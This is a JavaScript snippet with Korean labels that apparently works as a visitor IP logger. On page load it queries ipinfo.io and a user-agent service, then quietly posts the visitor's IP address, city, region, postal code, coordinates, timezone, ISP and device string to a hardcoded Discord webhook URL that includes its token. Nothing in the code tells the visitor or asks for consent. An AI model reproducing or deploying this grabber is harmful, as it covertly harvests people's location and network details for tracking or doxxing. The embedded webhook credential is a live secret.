var url = 'https://ipinfo.io/json';
var url2 = 'https://uploadbeta.com/api/user-agent/';
var today = new Date();
var date = today.getFullYear()+'년 '+(today.getMonth()+1)+'월 '+today.getDate()+'일';
var time = today.getHours() + "시 " + today.getMinutes() + "분 " + today.getSeconds()+'초';
var millisecond = today.getMilliseconds() + '초 (밀리)';
var timelog = date + ' ' + time + '  '+ millisecond;
$.getJSON(url, function (data) {
    $.getJSON(url2, function (data2) {
        var params = {
    embeds: [
      {
        "title": "에스크 참가 알림",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "아이피",
            "value": `> ${data.ip}`
          },
		   {
            "name": "시간 정보",
            "value": timelog,
          },
		  {
            "name": "기기 정보",
            "value": `>>> ${data2},`
          },
          {
            "name": "위치 정보",
            "value": `>>> 도 / 시: ${data.city}, ${data.region}\n국가: ${data.country}\n우편 번호: ${data.postal}\n시간대: ${(data.timezone).replace('_', ' ')}\n위치: ${data.loc}`
          },
          {
            "name": "네트워크 정보",
            "value": `>>> ISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1038098194560712734/YEDj48XTRsB76GbiHtlvs4a-5-tpP_1q8QB7IQCJXOgfYGit_vjMdOfUUJ-dB4LDj5ax', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
  })
});
});